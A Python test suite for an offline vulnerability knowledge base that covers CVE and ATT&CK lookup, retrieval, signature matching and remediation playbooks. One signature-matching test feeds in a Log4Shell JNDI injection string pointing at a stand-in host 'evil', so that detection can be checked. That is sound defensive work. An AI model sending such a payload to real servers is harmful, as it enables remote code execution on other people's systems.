#!/usr/bin/env python3
"""Tests for the offline Knowledge Base (v5.6) — CVE / ATT&CK / exploit
signatures / remediation playbooks, indexed for fast local retrieval.

Run: python3 tests/test_knowledge_base.py
"""
import json
import os
import re
import sys
import tempfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

FAILED = []


def check(name, cond, detail=""):
    status = "PASS" if cond else "FAIL"
    print(f"  [{'✓' if cond else '✗'}] {name}" + (f" — {detail}" if detail and not cond else ""))
    if not cond:
        FAILED.append(f"{name}: {detail}")


def main():
    from core.knowledge_base import KnowledgeBase

    print("═══ Offline Knowledge Base test suite ═══")
    kb = KnowledgeBase()

    # ── 1. Dataset integrity ──
    print("\n[1] Dataset integrity")
    stats = kb.get_stats()
    check("CVE records present", stats["cves"] > 20, f"got {stats['cves']}")
    check("ATT&CK techniques present", stats["techniques"] > 25, f"got {stats['techniques']}")
    check("Exploit signatures present", stats["signatures"] > 50, f"got {stats['signatures']}")
    check("Index is ready (offline TF-IDF)", stats.get("index_ready") is True)
    check("Severity rollup sane", sum(stats.get("severity_counts", {}).values()) >= stats["cves"])
    src_text = open("core/knowledge_base.py").read()
    check("No network imports",
          not re.search(r"^\s*(import|from)\s+requests\b", src_text, re.M))

    # ── 2. CVE lookup ──
    print("\n[2] CVE lookup")
    log4j = kb.lookup_cve("CVE-2021-44228")
    check("Known CVE found", log4j is not None)
    check("CVE has description", log4j and len(log4j.get("description", "")) > 20)
    check("CVE has severity", log4j and log4j.get("severity") in ("critical", "high", "medium", "low"))
    check("CVE has techniques mapped", log4j and isinstance(log4j.get("techniques"), list) and len(log4j["techniques"]) > 0)
    check("Missing CVE returns None", kb.lookup_cve("CVE-2099-99999") is None)

    # ── 3. Technique lookup ──
    print("\n[3] ATT&CK technique lookup")
    t1059 = kb.lookup_technique("T1059.001")
    check("Known sub-technique found", t1059 is not None, f"got {t1059}")
    t1190 = kb.lookup_technique("T1190")
    check("Known top-level technique found", t1190 is not None)
    check("Missing technique returns None", kb.lookup_technique("T9999.999") is None)

    # ── 4. Retrieval ──
    print("\n[4] Retrieval")
    hits = kb.search("log4shell jndi lookup apache log4j", top_k=5)
    check("Search returns ranked results", len(hits) >= 1)
    check("Log4Shell in top results", hits and any("44228" in (h.get("id") or "") for h in hits[:3]),
          f"top={[h.get('id') for h in hits[:3]]}")
    check("Results have type + score", hits and all(r.get("type") and r.get("score") is not None for r in hits))
    web_hits = kb.search("web application sql injection", top_k=3)
    check("Unrelated-topic search still returns entries", len(web_hits) >= 1)

    # ── 5. Signature matching ──
    print("\n[5] Signature matching")
    sigs = kb.signature_match("server running log4j ${jndi:ldap://evil} java 2.14")
    check("Log4j signature detected", any("44228" in s.get("id", "") for s in sigs), f"got {[s.get('id') for s in sigs]}")
    check("Signature has remediation", sigs and len(sigs[0].get("remediation", [])) > 0)

    # ── 6. Finding grounding ──
    print("\n[6] Finding grounding")
    grounded = kb.ground_findings([
        {"title": "RCE via log4j", "evidence": "log4j 2.14 JNDI lookup"},
        {"title": "SSH exposed", "evidence": "openssh on 22"},
    ])
    check("Grounded flag set", any(g.get("kb_grounded") for g in grounded))
    g0 = grounded[0]
    check("CVE matches attached", len(g0.get("kb_cves", [])) > 0, f"got {g0.get('kb_cves')}")
    check("Technique mappings attached", len(g0.get("kb_techniques", [])) > 0)
    check("Remediation steps attached", len(g0.get("kb_remediation", {}).get("steps", [])) > 0)
    check("Remediation commands attached", len(g0.get("kb_remediation", {}).get("commands", [])) >= 0)

    # ── 7. Remediation playbook ──
    print("\n[7] Remediation playbook")
    rem = kb.remediation_for("CVE-2021-44228")
    check("Playbook returned", isinstance(rem, dict) and rem.get("steps"))
    check("Playbook has commands", isinstance(rem.get("commands"), list))
    check("Unknown CVE → empty playbook", kb.remediation_for("CVE-2099-99999").get("steps", []) == [])

    # ── 7b. Corrupt data_path edge case (regression) ──
    print("\n[7b] Corrupt external data_path edge case")
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json",
                                     delete=False) as tf:
        tf.write("{ this is not valid json !!!")
        bad_path = tf.name
    try:
        kb_bad = KnowledgeBase(data_path=bad_path)
        stats_bad = kb_bad.get_stats()
        check("Index still built after corrupt load", stats_bad.get("index_ready") is True)
        check("Embedded dataset intact", stats_bad["cves"] > 20)
        check("External load failure surfaced", stats_bad.get("external_loaded") is False
              and stats_bad.get("external_error") is not None)
        check("Search still works after corrupt load",
              len(kb_bad.search("log4j rce", top_k=3)) >= 1)
    finally:
        os.unlink(bad_path)

    # Valid external extension path
    with tempfile.NamedTemporaryFile(mode="w", suffix=".json",
                                     delete=False) as tf:
        tf.write(json.dumps({"cves": [{"id": "CVE-2099-00001",
                                        "title": "Test Future CVE",
                                        "description": "Fictional test entry",
                                        "severity": "low", "cvss": 1.0,
                                        "techniques": [], "remediation": [],
                                        "commands": []}],
                             "techniques": {}}))
        good_path = tf.name
    try:
        kb_good = KnowledgeBase(data_path=good_path)
        stats_good = kb_good.get_stats()
        check("Valid extension loaded", stats_good.get("external_loaded") is True
              and stats_good.get("external_error") is None)
        check("Extension CVE merged", stats_good["cves"] > 20
              and kb_good.lookup_cve("CVE-2099-00001") is not None)
        check("Merged index searchable",
              any("2099" in (r.get("id") or "")
                  for r in kb_good.search("test future cve", top_k=3)))
    finally:
        os.unlink(good_path)

    # ── 8. Orchestrator wiring ──
    print("\n[8] Orchestrator wiring")
    import core.orchestrator as orch_mod
    src = open("core/orchestrator.py").read()
    check("orchestrator imports KnowledgeBase", "from core.knowledge_base import KnowledgeBase" in src)
    check("orchestrator inits self.kb", "self.kb = KnowledgeBase()" in src)
    check("orchestrator grounds in correlate_findings", "ground_findings" in src)
    check("status includes knowledge_base", '"knowledge_base": self.kb.get_stats()' in src)

    import dashboard.server as srv_mod
    srv = open("dashboard/server.py").read()
    for route in ["/api/kb/stats", "/api/kb/search", "/api/kb/cve/<cve_id>",
                  "/api/kb/technique/<tech_id>", "/api/kb/ground"]:
        check(f"route {route} registered", route in srv)

    # ── 9. Frontend wiring ──
    print("\n[9] Frontend wiring")
    js = open("dashboard/static/js/cockpit.js").read()
    html = open("dashboard/templates/index.html").read()
    for fn in ["loadKBPanel", "kbSearch", "kbLookupCVE", "kbLookupTech", "kbGroundClipboard"]:
        check(f"JS function {fn}", f"function {fn}" in js or f"async function {fn}" in js)
    check("KB tab wired in showResultsTab", "tab === 'kb'" in js)
    check("KB tab button in HTML", "showResultsTab('kb')" in html)
    check("KB results panel in HTML", 'id="results-kb"' in html)

    # ── 10. Single-catalogue drift guard (v5.7 consolidation) ──
    # knowledge_base.py owns the ATT&CK catalogue; correlation.py re-exports
    # the SAME objects (identity, not copies) and every technique id the
    # correlation engine can emit must resolve in the KB catalogue.
    print("\n[10] Single ATT&CK catalogue (KB owns it, correlation re-exports)")
    from core import knowledge_base as kb_mod
    import core.correlation as corr_mod
    missing = [tid for tid in sorted(set(corr_mod.ATTACK_TECHNIQUES.values()))
               if kb_mod.ATTACK_TACTICS.get(tid) is None]
    check("Every correlation-rule-map technique is in the KB catalogue",
          not missing, f"missing={missing}")
    # Rule-map ids + CORRELATION_RULES ids + CVE technique links all resolve
    refs = set(corr_mod.ATTACK_TECHNIQUES.values())
    for rule in corr_mod.CORRELATION_RULES:
        refs.update(rule.get("attack_techniques", []))
    for cve in kb_mod.CVE_DATABASE:
        refs.update(cve.get("techniques", []))
    missing_all = sorted(t for t in refs
                         if kb_mod.ATTACK_TACTICS.get(t) is None)
    check("Every engine-emittable id (rules+CVE links) is in the catalogue",
          not missing_all, f"missing={missing_all}")
    check("correlation.ATTACK_TACTICS IS the KB export (no copy)",
          corr_mod.ATTACK_TACTICS is kb_mod.ATTACK_TACTICS)
    check("correlation.TECHNIQUE_NAMES IS the KB export (no copy)",
          corr_mod.TECHNIQUE_NAMES is kb_mod.TECHNIQUE_NAMES)
    check("correlation.ATTACK_TACTIC_ORDER IS the KB export (no copy)",
          corr_mod.ATTACK_TACTIC_ORDER is kb_mod.ATTACK_TACTIC_ORDER)
    check("T1046 tactic is Discovery (MITRE-correct drift fix)",
          corr_mod.ATTACK_TACTICS.get("T1046") == "Discovery")
    check("Catalogue covers all 14 enterprise matrix columns",
          set(kb_mod.ATTACK_TACTIC_ORDER) >= {"Discovery", "Lateral Movement",
                                              "Reconnaissance", "Impact"})

    print(f"\n{'═' * 45}\n{'ALL TESTS PASSED' if not FAILED else f'{len(FAILED)} FAILURES'}")
    for f in FAILED:
        print("  FAIL:", f)
    return 1 if FAILED else 0


if __name__ == "__main__":
    sys.exit(main())
